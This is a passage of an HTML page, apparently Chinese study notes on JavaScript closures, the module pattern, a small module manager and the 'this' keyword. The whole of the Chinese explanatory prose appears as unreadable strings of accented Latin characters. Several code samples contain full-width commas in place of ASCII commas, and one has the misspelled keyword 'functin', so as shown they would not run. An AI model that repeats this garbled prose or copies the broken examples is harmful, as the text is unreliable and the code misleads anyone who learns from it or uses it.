class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> something = <span class="string">&quot;cool&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> another = [<span class="number">1</span>ï¼Œ <span class="number">2</span>ï¼Œ <span class="number">3</span>];</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log( something );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">doAnother</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log( another.join( <span class="string">&quot; ! &quot;</span> ) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">doSomething</span>: doSomethingï¼Œ</span><br><span class="line">  <span class="attr">doAnother</span>: doAnother</span><br><span class="line">  &#125;; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> foo = CoolModule(); </span><br><span class="line"></span><br><span class="line">foo.doSomething(); <span class="comment">// cool</span></span><br><span class="line">foo.doAnother(); <span class="comment">// 1 ! 2 ! 3</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬å¯¹ä¸Šé¢è¿™æ®µä»£ç è¿›æˆåˆ†è¡Œåˆ†æ:<br>ç§æœ‰æ•°æ®å˜é‡:somethingï¼Œ another<br>å†…éƒ¨å‡½æ•°:doSomethingï¼Œ doAnother<br>ç›´æ¥è¯´ç»“è®ºï¼Œä¸Šé¢è¿™ä¸ªä¾‹å­å°±æ˜¯æ¨¡å—æ¨¡å¼ã€‚<strong>å®ƒreturnè¿”å›çš„è¿™ä¸ªå¯¹è±¡ä¹Ÿå°±æ˜¯æ¨¡å—ä¹Ÿè¢«ç§°ä¸ºå…¬å…±APIã€‚CoolModule()å°±æ˜¯æ¨¡å—æ„é€ å™¨æˆ–è€…å«æ¨¡å—å‡½æ•°ã€‚</strong><br><strong>æ³¨æ„</strong>:</p><ul><li><strong>è¿™é‡Œçš„æ¨¡å—å’Œæˆ‘ä»¬æ‰€è¯´çš„æ¨¡å—åŒ–å¼€å‘ä¸æ˜¯å®Œå…¨ä¸€æ ·çš„ï¼</strong></li><li>æ¨¡å—ä¸ä¸€å®šéè¦æ˜¯æ ‡å‡†å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå‡½æ•°æœ¬è´¨ä¸Šä¹Ÿæ˜¯å¯¹è±¡ï¼Œå‡½æ•°ä¹Ÿå¯ä»¥æœ‰è‡ªå·±çš„å±æ€§ã€‚</li><li>CoolModule() åªæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå¿…é¡»è¦é€šè¿‡è°ƒç”¨å®ƒæ¥åˆ›å»ºä¸€ä¸ªæ¨¡å—å®ä¾‹ã€‚å¦‚æœä¸æ‰§è¡Œå¤–éƒ¨å‡½æ•°ï¼Œå†…éƒ¨ä½œç”¨åŸŸå’Œé—­åŒ…éƒ½æ— æ³•è¢«åˆ›å»ºã€‚ï¼ˆå› ä¸ºå‡½æ•°è°ƒç”¨ä¸€æ¬¡æ‰ä¼šåˆ›å»ºä¸€ä¸ªè¯¥å‡½æ•°çš„ä½œç”¨åŸŸï¼ŒåŒ…æ‹¬åˆ›å»ºå®ƒé‡Œé¢çš„å˜é‡å’Œå‡½æ•°ï¼‰</li></ul><p><strong>æ¨¡å—æ¨¡å¼:</strong><br>æ¨¡å—æ¨¡å¼éœ€è¦å…·å¤‡ä»¥ä¸‹2ä¸ªæ¡ä»¶ï¼šï¼ˆç»“åˆä¸Šé¢ä¾‹å­ï¼‰</p><ul><li>å¿…é¡»æœ‰å¤–éƒ¨çš„å°é—­å‡½æ•°(å³CoolModule)ï¼Œè¯¥å‡½æ•°å¿…é¡»è‡³å°‘è¢«è°ƒç”¨ä¸€æ¬¡(æ¯æ¬¡è°ƒç”¨éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ¨¡å—å®ä¾‹â€“&gt;æ¨¡å—å®ä¾‹æŒ‡çš„å°±æ˜¯å‡½æ•°returnè¿”å›çš„å¯¹è±¡)ã€‚</li><li>å°é—­å‡½æ•°(å³CoolModule)å¿…é¡»è¿”å›è‡³å°‘ä¸€ä¸ªå†…éƒ¨å‡½æ•°(å³doSomethingï¼Œ doAnother)ï¼Œè¿™æ ·å†…éƒ¨å‡½æ•°æ‰èƒ½åœ¨ç§æœ‰ä½œç”¨åŸŸä¸­å½¢æˆé—­åŒ…ï¼Œå¹¶ä¸”å¯ä»¥è®¿é—®æˆ–è€…ä¿®æ”¹ç§æœ‰çš„çŠ¶æ€(å³somethingï¼Œ another)ã€‚</li></ul><p><strong>æ¨¡å—:</strong><br>è¡¨é¢ä¸Šçœ‹ç”±æ¨¡å—å‡½æ•°(ä¾‹å­ä¸­çš„CoolModule)æ‰€è¿”å›çš„å¯¹è±¡å°±æ˜¯æ¨¡å—ï¼Œä½†**æ¨¡å—è¿˜å¿…é¡»è¿˜åŒ…å«æ¨¡å—å‡½æ•°çš„å†…éƒ¨å‡½æ•°(å³é—­åŒ…å‡½æ•°)**ã€‚</p><p><strong>æ¨¡å—å‡½æ•°:</strong><br>æ¨¡å—å‡½æ•°ä¹Ÿå°±æ˜¯æ¨¡å—æ„é€ å™¨ï¼Œä¾‹å­ä¸­çš„CoolModule().ä¸€èˆ¬å®ƒæœ‰ä¸¤ä¸ªå¸¸è§ç”¨æ³•.</p><ul><li>é€šè¿‡æ¥å—å‚æ•°ï¼Œå¯¹è¾“å‡ºçš„æ¨¡å—è¿›è¡Œä¿®æ”¹ã€‚</li><li>é€šè¿‡æ·»åŠ æ¨¡å—é‡Œæ·»åŠ ç›¸å…³çš„å†…éƒ¨å‡½æ•°ï¼Œå®ç°å¯¹è¾“å‡ºæ¨¡å—æ•°æ®çš„å¢åˆ æ”¹æŸ¥ã€‚(ä¹¦ä¸­ç”¨<code>å‘½åå°†è¦ä½œä¸ºå…¬å…±APIè¿”å›çš„å¯¹è±¡</code>ï¼Œæˆ‘ï¼ˆåŸåšå®¢ä½œè€…ï¼‰è§‰å¾—<code>å‘½å</code>åº”è¯¥æ˜¯ç”¨é”™äº†ï¼Œåº”è¯¥æ˜¯<code>ä¿®æ”¹</code>å³å¢åˆ æ”¹æŸ¥æ›´å¥½)</li></ul><h4 id="5-5-1-ç°ä»£çš„æ¨¡å—æœºåˆ¶"><a href="#5-5-1-ç°ä»£çš„æ¨¡å—æœºåˆ¶" class="headerlink" title="5.5.1 ç°ä»£çš„æ¨¡å—æœºåˆ¶"></a><strong>5.5.1 ç°ä»£çš„æ¨¡å—æœºåˆ¶</strong></h4><p>å¤§å¤šæ•°æ¨¡å—ä¾èµ–åŠ è½½å™¨ / ç®¡ç†å™¨æœ¬è´¨ä¸Šéƒ½æ˜¯å°†è¿™ç§æ¨¡å—å®šä¹‰å°è£…è¿›ä¸€ä¸ªå‹å¥½çš„ APIã€‚<br>ä¸‹é¢å°±ä»‹ç»ä¸€ä¸ªç®€å•çš„æ¨¡å—ç®¡ç†å™¨å®ç°ä¾‹å­(å¯¹ä¹¦ä¸­çš„ä¾‹å­è¿›è¡Œé€è¡Œè§£è¯»):</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//é¦–å…ˆå®ä¾‹åŒ–æˆ‘ä»¬çš„æ¨¡å—ç®¡ç†å™¨ï¼Œå–åmyModules</span></span><br><span class="line"><span class="keyword">var</span> MyModules=(<span class="function"><span class="keyword">function</span> <span class="title">Manager</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ä½œä¸ºæˆ‘ä»¬çš„æ¨¡å—æ± ï¼Œä¿å­˜æ‰€æœ‰å®šä¹‰çš„æ¨¡å—</span></span><br><span class="line">    <span class="keyword">var</span> modules=&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *ä½¿ç”¨ç±»ä¼¼AMDçš„æ–¹å¼å®šä¹‰æ–°æ¨¡å—ï¼Œæ¥æ”¶3ä¸ªå‚æ•°</span></span><br><span class="line"><span class="comment">     *name:æ¨¡å—å</span></span><br><span class="line"><span class="comment">     *deps:æ•°ç»„å½¢å¼è¡¨ç¤ºæ‰€ä¾èµ–çš„å…¶ä»–æ¨¡å—</span></span><br><span class="line"><span class="comment">     *impl:æ¨¡å—åŠŸèƒ½çš„å®ç°</span></span><br><span class="line"><span class="comment">    **/</span> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">nameï¼Œdepsï¼Œimpl</span>) </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//éå†ä¾èµ–æ¨¡å—æ•°ç»„çš„æ¯ä¸€é¡¹ï¼Œä»ç¨‹åºæ± ä¸­å–å‡ºå¯¹åº”çš„æ¨¡å—ï¼Œå¹¶èµ‹å€¼.</span></span><br><span class="line"><span class="comment">//å¾ªç¯å®Œåï¼Œdepsç”±ä¿å­˜æ¨¡å—åçš„æ•°ç»„å˜æˆäº†ä¿å­˜å¯¹åº”æ¨¡å—çš„æ•°ç»„.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;deps.length;i++) &#123;</span><br><span class="line">            deps[i]=modules[deps[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//å°†æ–°æ¨¡å—å­˜å‚¨è¿›æ¨¡å—æ± ï¼Œå¹¶é€šè¿‡applyæ³¨å…¥å®ƒæ‰€ä¾èµ–çš„æ¨¡å—(å³éå†åçš„depsï¼Œå®é™…ä¸Šå°±æ˜¯ç”¨depsä½œä¸ºimplçš„å…¥å‚)</span></span><br><span class="line">        modules[name]=impl.apply(implï¼Œdeps);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ä»æ¨¡å—æ± ä¸­å–å‡ºå¯¹åº”æ¨¡å—</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> modules[name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æš´éœ²å®šä¹‰æ¨¡å—å’Œè·å–æ¨¡å—çš„ä¸¤ä¸ªapi</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">define</span>: defineï¼Œ</span><br><span class="line">        <span class="attr">get</span>: get</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p><strong>è¯´æ˜:</strong>  åé¢ä¹¦ä¸­è¯´äº†è¿™ä¹ˆä¸€å¥<code>ä¸ºäº†æ¨¡å—çš„å®šä¹‰å¼•å…¥äº†åŒ…è£…å‡½æ•°(å¯ä»¥ä¼ å…¥ä»»ä½•ä¾èµ–)</code>ï¼Œè¿™é‡ŒåŒ…è£…å‡½æ•°æŒ‡çš„æ˜¯Manger()ï¼ŒåŒæ ·ä¹Ÿæ˜¯æˆ‘ä»¬ä¸ŠèŠ‚æåˆ°çš„æ¨¡å—å‡½æ•°ã€‚é¦–å…ˆè¯´æ˜ä¸‹ä»€ä¹ˆæ˜¯åŒ…è£…å‡½æ•°ï¼šä¾‹å¦‚å‡½æ•°Aå½“ä¸­è¿˜æœ‰ä¸€ä¸ªå‡½æ•°Bï¼Œå½“æˆ‘ä»¬æƒ³è¦è°ƒç”¨å‡½æ•°Bçš„æ—¶å€™ï¼Œåˆ™éœ€è¦å…ˆè°ƒç”¨å‡½æ•°Aï¼Œé‚£ä¹ˆå‡½æ•°Aå°±å«åšå‡½æ•°Bçš„åŒ…è£…å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æƒ³è°ƒç”¨æŸä¸ªæ¨¡å—æ—¶ï¼Œéœ€è¦å…ˆè°ƒç”¨å®ƒçš„åŒ…è£…å‡½æ•°å³è¿™é‡Œçš„Manger()ï¼›æ¥ç€æ˜¯åé¢é‚£å¥<code>å¹¶ä¸”å°†è¿”å›å€¼ï¼Œä¹Ÿå°±æ˜¯æ¨¡å—çš„ APIï¼Œå‚¨å­˜åœ¨ä¸€ä¸ªæ ¹æ®åå­—æ¥ç®¡ç†çš„æ¨¡å—åˆ—è¡¨ä¸­ã€‚</code>æ³¨æ„è¿™é‡Œçš„è¿”å›å€¼æ˜¯æŒ‡implçš„è¿”å›å€¼ã€‚</p><p>æ¥ç€çœ‹é€šè¿‡ç®¡ç†å™¨æ¥å®šä¹‰å’Œä½¿ç”¨æ¨¡å—</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">MyModules.define(<span class="string">&#x27;bar&#x27;</span>ï¼Œ[]ï¼Œ<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hello</span> (<span class="params">who</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Let me introduce: &quot;</span> + who;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//è¿”å›å…¬å…±API å³æä¾›ä¸€ä¸ªhelloçš„æ¥å£</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">hello</span>:hello</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">MyModules.define(<span class="string">&#x27;foo&#x27;</span>ï¼Œ[<span class="string">&#x27;bar&#x27;</span>]ï¼Œ<span class="function"><span class="keyword">function</span> (<span class="params">bar</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> hungry = <span class="string">&quot;hippo&quot;</span>;</span><br><span class="line"></span><br><span class="line">    functin awesome () &#123;</span><br><span class="line"><span class="comment">//è¿™é‡Œçš„barä¸ºè¿”å›æ¨¡å—barè¿”å›çš„å…¬å…±API</span></span><br><span class="line">        <span class="built_in">console</span>.log( bar.hello( hungry ).toUpperCase() );</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//è¿”å›å…¬å…±API å³æä¾›ä¸€ä¸ªawesomeçš„æ¥å£</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">awesome</span>:awesome</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar=MyModules.get(<span class="string">&#x27;bar&#x27;</span>);<span class="comment">//é€šè¿‡ç®¡ç†å™¨è·å–æ¨¡å—&#x27;bar&#x27;</span></span><br><span class="line"><span class="keyword">var</span> foo=MyModules.get(<span class="string">&#x27;foo&#x27;</span>);<span class="comment">//é€šè¿‡ç®¡ç†å™¨è·å–æ¨¡å—&#x27;foo&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(</span><br><span class="line"><span class="comment">//è°ƒç”¨æ¨¡å—barçš„helloæ¥å£</span></span><br><span class="line">         bar.hello( <span class="string">&quot;hippo&quot;</span> ) </span><br><span class="line">); <span class="comment">// Let me introduce: hippo </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨æ¨¡å—fooçš„awesomeæ¥å£</span></span><br><span class="line">foo.awesome(); <span class="comment">// LET ME INTRODUCE: HIPPO</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™èŠ‚çš„ä¸»è¦å†…å®¹è¿˜æ˜¯äº†è§£ç°åœ¨æ˜¯å¦‚ä½•å¯¹æ¨¡å—è¿›è¡Œä¸€ä¸ªè§„èŒƒå¤„ç†ã€‚ä¸»è¦æ˜¯ä¸¤éƒ¨åˆ†å†…å®¹ï¼Œä¸€ä¸ªæ˜¯é€šè¿‡åç§°å’Œä¾èµ–åˆç†å®šä¹‰æ¨¡å—å¹¶å‚¨å­˜ï¼›å¦ä¸€ä¸ªåˆ™æ˜¯é€šè¿‡åç§°å¯¹å­˜å‚¨çš„æ¨¡å—çš„è°ƒç”¨ã€‚</p><h4 id="5-5-2-æœªæ¥çš„æ¨¡å—æœºåˆ¶"><a href="#5-5-2-æœªæ¥çš„æ¨¡å—æœºåˆ¶" class="headerlink" title="5.5.2 æœªæ¥çš„æ¨¡å—æœºåˆ¶"></a><strong>5.5.2 æœªæ¥çš„æ¨¡å—æœºåˆ¶</strong></h4><p>è¿™èŠ‚è¯´çš„æ¨¡å—å°±æ˜¯æˆ‘å¸¸è¯´çš„æ¨¡å—åŒ–å¼€å‘ï¼Œå¹¶ä¸”ä¸»è¦æåˆ°çš„å°±æ˜¯ES6é‡Œå¸¸ç”¨çš„importã€‚</p><h3 id="5-6-å°ç»“"><a href="#5-6-å°ç»“" class="headerlink" title="5.6 å°ç»“"></a>5.6 å°ç»“</h3><p>é—­åŒ…:å½“å‡½æ•°å¯ä»¥è®°ä½å¹¶è®¿é—®æ‰€åœ¨çš„è¯æ³•ä½œç”¨åŸŸï¼Œå¹¶ä¸”å‡½æ•°æ˜¯åœ¨å½“å‰è¯æ³•ä½œç”¨åŸŸä¹‹å¤–æ‰§è¡Œï¼Œè¿™æ—¶å°±äº§ç”Ÿäº†é—­åŒ…ã€‚</p><p>æ¨¡å—æœ‰ä¸¤ä¸ªä¸»è¦ç‰¹å¾:</p><ul><li>ä¸ºåˆ›å»ºå†…éƒ¨ä½œç”¨åŸŸè€Œè°ƒç”¨äº†ä¸€ä¸ªåŒ…è£…å‡½æ•°(æ¨¡å—æ„é€ å™¨çš„å®ä¾‹åŒ–);</li><li>åŒ…è£…å‡½æ•°çš„è¿”å›å€¼(ä¹Ÿå°±æ˜¯æ¨¡å—)å¿…é¡»è‡³å°‘åŒ…æ‹¬ä¸€ä¸ªå¯¹å†…éƒ¨å‡½æ•°çš„å¼•ç”¨ï¼Œè¿™æ ·å°±ä¼šåˆ›å»ºæ¶µç›–æ•´ä¸ªåŒ…è£…å‡½æ•°å†…éƒ¨ä½œç”¨åŸŸçš„é—­åŒ…ã€‚</li></ul><h1 id="ç¬¬äºŒéƒ¨åˆ†"><a href="#ç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ†"></a>ç¬¬äºŒéƒ¨åˆ†</h1><h2 id="ç¬¬ä¸€ç« -å…³äºthis"><a href="#ç¬¬ä¸€ç« -å…³äºthis" class="headerlink" title="ç¬¬ä¸€ç«  å…³äºthis"></a>ç¬¬ä¸€ç«  å…³äºthis</h2><h3 id="1-1-ä¸ºä»€ä¹ˆè¦ç”¨this"><a href="#1-1-ä¸ºä»€ä¹ˆè¦ç”¨this" class="headerlink" title="1.1 ä¸ºä»€ä¹ˆè¦ç”¨this"></a>1.1 ä¸ºä»€ä¹ˆè¦ç”¨this</h3><p>å› ä¸ºthis æä¾›äº†ä¸€ç§æ›´ä¼˜é›…çš„æ–¹å¼æ¥éšå¼â€œä¼ é€’â€ä¸€ä¸ªå¯¹è±¡(å³ä¸Šä¸‹æ–‡å¯¹è±¡)å¼•ç”¨ï¼Œå› æ­¤å¯ä»¥å°† API è®¾è®¡å¾—æ›´åŠ ç®€æ´å¹¶ä¸”æ˜“äºå¤ç”¨ã€‚</p><h3 id="1-2-è¯¯è§£"><a href="#1-2-è¯¯è§£" class="headerlink" title="1.2 è¯¯è§£"></a>1.2 è¯¯è§£</h3><p>ä¸‹é¢ä¸¤ç§å¸¸è§çš„å¯¹äº this çš„è§£é‡Šéƒ½æ˜¯é”™è¯¯çš„(çœ‹çœ‹å°±å¥½ï¼Œå°±ä¸è¿‡å¤šè§£è¯»äº†ï¼Œä»¥å…å¢åŠ äº†å¯¹é”™è¯¯çš„å°è±¡)ã€‚</p><h4 id="1-2-1-æŒ‡å‘è‡ªèº«"><a href="#1-2-1-æŒ‡å‘è‡ªèº«" class="headerlink" title="1.2.1 æŒ‡å‘è‡ªèº«"></a>1.2.1 æŒ‡å‘è‡ªèº«</h4><p>äººä»¬å¾ˆå®¹æ˜“æŠŠ this ç†è§£æˆæŒ‡å‘å‡½æ•°è‡ªèº«.    </p><p>å…·åå‡½æ•°ï¼Œå¯ä»¥åœ¨å®ƒå†…éƒ¨å¯ä»¥ä½¿ç”¨å‡½æ•°åæ¥å¼•ç”¨è‡ªèº«è¿›è¡Œé€’å½’ï¼Œæ·»åŠ å±æ€§ç­‰ã€‚ä¾‹å¦‚:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  foo.count = <span class="number">4</span>; <span class="comment">// foo æŒ‡å‘å®ƒè‡ªèº«</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒ¿åå‡½æ•°å¦‚æœæƒ³è¦è°ƒç”¨è‡ªèº«åˆ™ï¼Œéœ€è¦ä½¿ç”¨<code>arguments.callee</code>ä¸è¿‡è¿™ä¸ªå±æ€§åœ¨ES5ä¸¥æ ¼æ¨¡å¼ä¸‹å·²ç»ç¦æ­¢äº†ï¼Œä¹Ÿä¸å»ºè®®ä½¿ç”¨ã€‚</p><h4 id="1-2-2-å®ƒçš„ä½œç”¨åŸŸ"><a href="#1-2-2-å®ƒçš„ä½œç”¨åŸŸ" class="headerlink" title="1.2.2 å®ƒçš„ä½œç”¨åŸŸ"></a>1.2.2 å®ƒçš„ä½œç”¨åŸŸ</h4><p><strong>åˆ‡è®°:</strong> <strong>this åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸æŒ‡å‘å‡½æ•°çš„è¯æ³•ä½œç”¨åŸŸã€‚ä½ ä¸èƒ½ä½¿ç”¨ this æ¥å¼•ç”¨ä¸€ä¸ªè¯æ³•ä½œç”¨åŸŸå†…éƒ¨çš„ä¸œè¥¿ã€‚</strong>è¿™éƒ¨åˆ†åªéœ€è®°ä½è¿™ä¸€æ®µè¯å°±è¡Œ.</p><p><strong>ç»ˆæç–‘é—®:</strong> JavaScripté‡Œçš„ä½œç”¨åŸŸåˆ°åº•æ˜¯å¯¹è±¡å—ï¼Ÿ<br>åœ¨JavaScripté‡Œï¼Œä½œç”¨åŸŸå…¶å®æ˜¯ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„å¯¹è±¡ï¼Œä½œç”¨åŸŸé‡Œæ‰€æœ‰å¯è§çš„æ ‡è¯†ç¬¦éƒ½æ˜¯å®ƒçš„å±æ€§ã€‚åªæ˜¯ä½œç”¨åŸŸå¯¹è±¡å¹¶ä¸èƒ½é€šè¿‡JavaScriptä»£ç è¢«æˆ‘ä»¬è®¿é—®ï¼Œå®ƒåªå­˜åœ¨äºJavaScriptå¼•æ“å†…éƒ¨ã€‚</p><h3 id="1-3-thisåˆ°åº•æ˜¯ä»€ä¹ˆ"><a href="#1-3-thisåˆ°åº•æ˜¯ä»€ä¹ˆ" class="headerlink" title="1.3 thisåˆ°åº•æ˜¯ä»€ä¹ˆ"></a>1.3 thisåˆ°åº•æ˜¯ä»€ä¹ˆ</h3><p>this æ˜¯åœ¨è¿è¡Œæ—¶è¿›è¡Œç»‘å®šçš„ï¼Œ<strong>å¹¶ä¸æ˜¯åœ¨ç¼–å†™æ—¶ç»‘å®š</strong>ï¼Œå®ƒçš„ä¸Šä¸‹æ–‡(å¯¹è±¡)å–å†³äºå‡½æ•°è°ƒç”¨æ—¶çš„å„ç§æ¡ä»¶ã€‚this çš„ç»‘å®šå’Œå‡½æ•°å£°æ˜çš„ä½ç½®æ²¡æœ‰ä»»ä½•å…³ç³»ï¼Œ<strong>åªå–å†³äºå‡½æ•°çš„è°ƒç”¨æ–¹å¼</strong>ã€‚</p><p>å½“ä¸€ä¸ªå‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ´»åŠ¨è®°å½•(æœ‰æ—¶å€™ä¹Ÿç§°ä¸ºæ‰§è¡Œä¸Šä¸‹æ–‡)ã€‚è¿™ä¸ªè®°å½•ä¼šåŒ…å«å‡½æ•°åœ¨å“ªé‡Œè¢«è°ƒç”¨(è°ƒç”¨æ ˆ)ã€å‡½æ•°çš„è°ƒç”¨æ–¹æ³•ã€ä¼ å…¥çš„å‚æ•°ç­‰ä¿¡æ¯ã€‚<strong>this å°±æ˜¯è®°å½•çš„å…¶ä¸­ä¸€ä¸ªå±æ€§</strong>ï¼Œä¼šåœ¨å‡½æ•°æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ç”¨åˆ°ã€‚(æ‰€ä»¥thiså¹¶ä¸ç­‰ä»·äºæ‰§è¡Œä¸Šä¸‹æ–‡)</p><h3 id="1-4-å°ç»“"><a href="#1-4-å°ç»“" class="headerlink" title="1.4 å°ç»“"></a>1.4 å°ç»“</h3><ul><li>å­¦ä¹  this çš„ç¬¬ä¸€æ­¥æ˜¯æ˜ç™½ this æ—¢ä¸æŒ‡å‘å‡½æ•°è‡ªèº«ä¹Ÿä¸æŒ‡å‘å‡½æ•°çš„è¯æ³•ä½œç”¨åŸŸã€‚</li><li>this å®é™…ä¸Šæ˜¯åœ¨å‡½æ•°è¢«è°ƒç”¨æ—¶å‘ç”Ÿçš„ç»‘å®šï¼Œ<strong>å®ƒæŒ‡å‘ä»€ä¹ˆå®Œå…¨å–å†³äºå‡½æ•°åœ¨å“ªé‡Œè¢«è°ƒç”¨</strong>ã€‚</li></ul><h2 id="ç¬¬äºŒç« -thiså…¨é¢è§£æ"><a href="#ç¬¬äºŒç« -thiså…¨é¢è§£æ" class="headerlink" title="ç¬¬äºŒç«  thiså…¨é¢è§£æ"></a>ç¬¬äºŒç«  thiså…¨é¢è§£æ</h2><h3 id="2-1-è°ƒç”¨ä½ç½®"><a href="#2-1-è°ƒç”¨ä½ç½®" class="headerlink" title="2.1 è°ƒç”¨ä½ç½®"></a>2.1 è°ƒç”¨ä½ç½®</h3><p>è°ƒç”¨ä½ç½®å°±æ˜¯å‡½æ•°åœ¨ä»£ç ä¸­è¢«è°ƒç”¨çš„ä½ç½®(<strong>è€Œä¸æ˜¯å£°æ˜çš„ä½ç½®</strong>)ã€‚å¯»æ‰¾è°ƒç”¨ä½ç½®æœ€é‡è¦çš„æ˜¯è¦åˆ†æ<strong>è°ƒç”¨æ ˆ</strong>ã€‚æˆ‘ä»¬å…³å¿ƒçš„è°ƒç”¨ä½ç½®å°±åœ¨å½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°çš„å‰ä¸€ä¸ªè°ƒç”¨ä¸­ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹åˆ°åº•ä»€ä¹ˆæ˜¯è°ƒç”¨æ ˆå’Œè°ƒç”¨ä½ç½®ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">baz</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// å½“å‰è°ƒç”¨æ ˆæ˜¯ï¼šbaz</span></span><br><span class="line"><span class="comment">// å› æ­¤ï¼Œå½“å‰è°ƒç”¨ä½ç½®æ˜¯å…¨å±€ä½œç”¨åŸŸ</span></span><br><span class="line"><span class="built_in">console</span>.log( <span class="string">&quot;baz&quot;</span> );</span><br><span class="line">bar(); <span class="comment">// &lt;-- bar çš„è°ƒç”¨ä½ç½®</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// å½“å‰è°ƒç”¨æ ˆæ˜¯ baz -&gt; bar</span></span><br><span class="line"><span class="comment">// å› æ­¤ï¼Œå½“å‰è°ƒç”¨ä½ç½®åœ¨ baz ä¸­</span></span><br><span class="line"><span class="built_in">console</span>.log( <span class="string">&quot;bar&quot;</span> );</span><br><span class="line">foo(); <span class="comment">// &lt;-- foo çš„è°ƒç”¨ä½ç½®</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// å½“å‰è°ƒç”¨æ ˆæ˜¯ baz -&gt; bar -&gt; foo</span></span><br><span class="line"><span class="comment">// å› æ­¤ï¼Œå½“å‰è°ƒç”¨ä½ç½®åœ¨ bar ä¸­</span></span><br><span class="line"><span class="built_in">console</span>.log( <span class="string">&quot;foo&quot;</span> );</span><br><span class="line">&#125;</span><br><span class="line">baz(); <span class="comment">// &lt;-- baz çš„è°ƒç”¨ä½ç½®</span></span><br></pre></td></tr></table></figure><h3 id="2-2-ç»‘å®šè§„åˆ™"><a href="#2-2-ç»‘å®šè§„åˆ™" class="headerlink" title="2.2 ç»‘å®šè§„åˆ™"></a>2.2 ç»‘å®šè§„åˆ™</h3><p>åœ¨æ‰¾åˆ°è°ƒç”¨ä½ç½®åï¼Œéœ€è¦åˆ¤å®šä»£ç å±äºä¸‹é¢å››ç§ç»‘å®šè§„åˆ™ä¸­çš„å“ªä¸€ç§ï¼Œç„¶åæ‰èƒ½å¯¹thisè¿›è¡Œç»‘å®šã€‚<br><strong>æ³¨æ„:</strong> thisç»‘å®šçš„æ˜¯ä¸Šä¸‹æ–‡<strong>å¯¹è±¡</strong>ï¼Œ<strong>å¹¶ä¸æ˜¯å‡½æ•°è‡ªèº«ä¹Ÿä¸æ˜¯å‡½æ•°çš„è¯æ³•ä½œç”¨åŸŸ</strong></p><h4 id="2-2-1-é»˜è®¤ç»‘å®š"><a href="#2-2-1-é»˜è®¤ç»‘å®š" class="headerlink" title="2.2.1 é»˜è®¤ç»‘å®š"></a>2.2.1 